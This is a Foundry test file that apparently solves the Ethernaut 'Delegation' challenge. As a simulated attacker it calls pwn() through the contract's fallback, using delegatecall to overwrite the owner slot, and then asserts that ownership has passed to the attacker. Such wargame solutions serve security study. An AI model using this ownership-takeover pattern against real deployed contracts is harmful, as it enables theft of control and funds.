// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import { Delegation, Delegate } from "../src/Delegation.sol";

contract DelegationTest is Test {
    
    Delegation public delegation;
    Delegate public delegate;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("Attacker");
    function setUp() public {
        delegate = new Delegate(owner);
        delegation = new Delegation(address(delegate));
    }

    function test_Attack() public {
        address initialOwner = delegation.owner();
        console.log("Initial Owner: ", initialOwner);

        vm.startPrank(attacker);
        // Invokes the fallback() in Delegation contract which calls the pwn() in Delegate contract and sets the owner to attacker(msg.sender)
        (bool s, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(s, "S not successful");
        vm.stopPrank();

        address ownerAfter = delegation.owner();
        console.log("Owner after attack:  ", ownerAfter);
        assertEq(ownerAfter, attacker, "Attacker is not owner : YOU LOST");
    }

}